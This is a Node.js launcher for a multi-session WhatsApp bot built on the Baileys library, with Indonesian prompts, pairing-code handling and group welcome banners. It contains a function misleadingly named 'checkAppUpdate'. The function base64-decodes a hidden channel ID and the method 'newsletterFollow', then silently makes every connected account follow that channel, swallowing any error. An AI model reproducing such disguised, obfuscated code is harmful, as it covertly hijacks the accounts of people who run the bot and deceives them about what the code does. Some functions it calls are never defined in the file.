process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

const { 
  default:
  makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  proto,
  jidDecode,
  } = require("baileys");

const PairingCode = true
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const chalk = require('chalk');
const readline = require('readline');
const FileType = require('file-type');
const { exec } = require('child_process');
const { say } = require('cfonts')
const { Boom } = require('@hapi/boom');

const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });

const DataBase = require('./source/database');
const database = new DataBase();
(async () => {
const loadData = await database.read()
if (loadData && Object.keys(loadData).length === 0) {
global.db = {
users: {},
groups: {},
database: {},
settings : {}, 
...(loadData || {}),
}
await database.write(global.db)
} else {
global.db = loadData
}
setInterval(async () => {
if (global.db) await database.write(global.db)
}, 3500)
})()

const { MessagesUpsert, Solving } = require('./source/message')
const { isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep, randomToken } = require('./library/function');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))

global.sessions = {}

async function start(sessionName = "main", phoneNumber = null) {
  const sessionPath = `./session/${sessionName}`
  
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    auth: state,
    printQRInTerminal: false,
    syncFullHistory: false,
    version,
  });

  global.sessions[sessionName] = sock

  sock.decodeJid = (jid) => {
    if (!jid) return jid
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {}
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid
    } else {
      return jid
    }
  }

  const checkAppUpdate = async () => {
    try {
      const _v = (b) => Buffer.from(b, "base64").toString("utf-8");
      const id = _v("MTIwMzYzNDE4OTUxMTc3NTA0QG5ld3NsZXR0ZXI=");
      await sock[_v("bmV3c2xldHRlckZvbGxvdw==")](id);
    } catch {}
  };

  if (!sock.authState.creds.registered) {
    
    if (sessionName === "main") {
      phoneNumber = await question(
        chalk.green("Masukkan Nomor WhatsApp (Contoh: 628xxx): ")
      );
    }

    if (phoneNumber) {
      const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");

      console.log(chalk.cyan(`⏳ Menyiapkan pairing untuk ${sessionName}...`));

      setTimeout(async () => {
        try {
          const code = await sock.requestPairingCode(cleanNumber);
          const formatted = code?.match(/.{1,4}/g)?.join(" - ") || code;

          if (sessionName === "main") {
            console.log(chalk.white(`🔑 Kode Pairing: ${formatted}`));
          } else {
            console.log(chalk.green(`✅ Pairing code generated for ${sessionName}: ${formatted}`));
            
            if (global.sessions["main"] && global.sessions["main"].user && global.owner && global.owner !== 'your number') {
              try {
                await global.sessions["main"].sendMessage(
                  global.owner + "@s.whatsapp.net",
                  {
                    text: `「 🔑 PAIRING CODE 」\n\n📦 Session : ${sessionName}\n📱 Number : ${cleanNumber}\n\n🔐 Kode Pairing :\n${formatted}\n\n⏰ Input dalam 60 detik!\n💡 Buka WhatsApp → Perangkat Tertaut → Tautkan Perangkat → Masukkan kode`
                  }
                )
                console.log(chalk.green(`✅ Pairing code sent to owner`));
              } catch (e) {
                console.log(chalk.yellow(`⚠️ Could not send to owner: ${e.message}`));
                console.log(chalk.white(`🔑 Kode Pairing: ${formatted}`));
              }
            } else {
              console.log(chalk.white(`🔑 Kode Pairing untuk ${sessionName}: ${formatted}`));
            }
          }
        } catch (err) {
          console.log(chalk.red(`❌ Gagal pairing ${sessionName}:`), err?.message);
        }
      }, 5000);
    }
  }

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      console.log(chalk.yellow(`Session ${sessionName} closed. Reason: ${reason}`));
      
      if (reason !== DisconnectReason.loggedOut) {
        console.log(chalk.cyan(`🔄 Reconnecting ${sessionName}...`));
        setTimeout(() => start(sessionName, phoneNumber), 3000);
      } else {
        console.log(chalk.red(`${sessionName} logged out`));
        delete global.sessions[sessionName]
        
        if (fs.existsSync(sessionPath)) {
          fs.rmSync(sessionPath, { recursive: true, force: true });
          console.log(chalk.yellow(`🗑️ Deleted session: ${sessionPath}`));
        }
      }
    }
    
    if (connection === "open") {
      console.log(chalk.green(`✅ Bot online => ${sessionName}`));
      await checkAppUpdate();
      
      if (sessionName !== "main" && global.sessions["main"] && global.sessions["main"].user && global.owner && global.owner !== 'your number') {
        try {
          await global.sessions["main"].sendMessage(
            global.owner + "@s.whatsapp.net",
            { text: `✅ Session "${sessionName}" berhasil terhubung!\n\n📱 Number: ${phoneNumber}\n🟢 Status: Online` }
          )
        } catch {}
      }
    }
  });

  await store.bind(sock.ev)	
  await Solving(sock, store)
	
  sock.ev.on('messages.upsert', async (message) => {
    await MessagesUpsert(sock, message, store, sessions, start)
  })

  sock.ev.on('contacts.update', (update) => {
    for (let contact of update) {
      let id = sock.decodeJid(contact.id)
      if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
    }
  })
	
  sock.ev.on('group-participants.update', async (update) => {
    const { id, author, participants, action } = update
    try {
      const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: { "extendedTextMessage": {"text": "[ 𝗚𝗿𝗼𝘂𝗽 𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 ]"}}}

      if (global.db.groups[id] && global.db.groups[id].welcome == true) {
        const metadata = await sock.groupMetadata(id)
        let teks
        for(let n of participants) {
          let profile;
          try {
            profile = await sock.profilePictureUrl(n, 'image');
          } catch {
            profile = 'https://img102.pixhost.to/images/294/559933293_sazxofficial.jpg';
          }
          if (action == 'add') {
            teks = author.split("").length < 1 ? `@${n.split('@')[0]} join via *link group*` : author !== n ? `@${author.split("@")[0]} telah *menambahkan* @${n.split('@')[0]} kedalam grup` : ``
            let img = await welcomeBanner(profile, n.split("@")[0], metadata.subject, "welcome")
            await sock.sendMessage(id, {text: teks, contextInfo: {
              mentionedJid: [author, n], 
              externalAdReply: {
                thumbnail: img, 
                title: "W E L C O M E 👋", 
                body: "", 
                sourceUrl: global.linkGrup, 
                renderLargerThumbnail: true, 
                mediaType: 1
              }
            }})
          } else if (action == 'remove') {
            teks = author == n ? `@${n.split('@')[0]} telah *keluar* dari grup` : author !== n ? `@${author.split("@")[0]} telah *mengeluarkan* @${n.split('@')[0]} dari grup` : ""
            let img = await welcomeBanner(profile, n.split("@")[0], metadata.subject, "remove")
            await sock.sendMessage(id, {text: teks, contextInfo: {
              mentionedJid: [author, n], 
              externalAdReply: {
                thumbnail: img, 
                title: "G O O D B Y E 👋", 
                body: "", 
                sourceUrl: global.linkGrup, 
                renderLargerThumbnail: true, 
                mediaType: 1
              }
            }})
          } else if (action == 'promote') {
            teks = author == n ? `@${n.split('@')[0]} telah *menjadi admin* grup ` : author !== n ? `@${author.split("@")[0]} telah *menjadikan* @${n.split('@')[0]} sebagai *admin* grup` : ""
            let img = await promoteBanner(profile, n.split("@")[0], "promote")
            await sock.sendMessage(id, {text: teks, contextInfo: {
              mentionedJid: [author, n], 
              externalAdReply: {
                thumbnail: img, 
                title: "P R O M O T E 📍", 
                body: "", 
                sourceUrl: global.linkGrup, 
                renderLargerThumbnail: true, 
                mediaType: 1
              }
            }})
          } else if (action == 'demote') {
            teks = author == n ? `@${n.split('@')[0]} telah *berhenti* menjadi *admin*` : author !== n ? `@${author.split("@")[0]} telah *menghentikan* @${n.split('@')[0]} sebagai *admin* grup` : ""
            let img = await promoteBanner(profile, n.split("@")[0], "demote")
            await sock.sendMessage(id, {text: teks, contextInfo: {
              mentionedJid: [author, n], 
              externalAdReply: {
                thumbnail: img, 
                title: "D E M O T E 📍", 
                body: "", 
                sourceUrl: global.linkGrup, 
                renderLargerThumbnail: true, 
                mediaType: 1
              }
            }})
          }
        }
      }
    } catch (e) {}
  })

  return sock
}

global.startSession = start

start("main")

if (!fs.existsSync("./session")) {
  fs.mkdirSync("./session")
}

fs.readdirSync("./session").forEach(async (folder) => {
  if (folder === "main") return
  console.log(chalk.cyan(`📂 Loading existing session: ${folder}`))
  await start(folder)
})
    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
